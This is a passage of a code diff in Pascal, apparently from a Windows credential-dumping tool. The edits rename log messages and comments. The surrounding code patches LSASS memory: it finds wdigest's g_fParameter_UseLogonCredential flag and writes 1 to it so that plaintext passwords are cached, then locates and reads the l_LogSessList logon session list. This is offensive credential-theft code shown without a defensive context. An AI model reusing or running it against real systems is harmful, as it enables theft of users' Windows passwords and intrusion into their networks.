@@ -946,11 +946,11 @@ result:=false;
       //CopyMemory(@offset_dword,@offset_byte[0],4);
       log('ReadProcessMemory OK '+inttohex(offset_dword,4));
       offset:=offset+sizeof(PTRN_WIN81_UseLogonCredential)+offset_dword+patch_pos;
-      log('g_UseLogonCredential offset:'+inttohex(offset,sizeof(pointer)));
+      log('g_fParameter_UseLogonCredential offset:'+inttohex(offset,sizeof(pointer)));
       //we now should get a match with dd wdigest!g_fParameter_UseLogonCredential
       //dw:=1;
       ReadMem (hprocess,offset,@dw,4);
-      log('g_UseLogonCredential value:'+inttostr(ByteSwap32(dw)));
+      log('g_fParameter_UseLogonCredential value:'+inttostr(ByteSwap32(dw)));
       dw:=ByteSwap32 (1);
       writemem(hprocess,offset,@dw,4);
       result:=true;
@@ -1061,7 +1061,7 @@ begin
                                    begin
                                    CopyMemory(@offset_list_dword,@offset_list[0],4);
                                    log('ReadProcessMemory OK '+inttohex(offset_list_dword{$ifdef CPU64}+4{$endif CPU64},4));
-                                   //we now should get a match with .load lsrsrv.dll then dd Lsasrv!LogonSessionList
+                                   //we now should get a match with .load wdigest.dll then dd wdigest!l_LogSessList
                                    //new offset to the list entry
                                    {$ifdef CPU64}
                                    offset:= offset+offset_list_dword+4+patch_pos;
@@ -1069,7 +1069,7 @@ begin
                                    {$ifdef CPU32}
                                    offset:= offset_list_dword{+patch_pos};
                                    {$endif CPU32}
-                                   log('offset:'+leftpad(inttohex(offset,sizeof(pointer)),sizeof(pointer) * 2,'0'),0);
+                                   log('offset l_LogSessList:'+leftpad(inttohex(offset,sizeof(pointer)),sizeof(pointer) * 2,'0'),0);
                                    //read sesslist at offset
                                    ReadMem  (hprocess,offset,logsesslist );
                                    dummy:=inttohex(i_logsesslist (logsesslist ).next,sizeof(pointer));
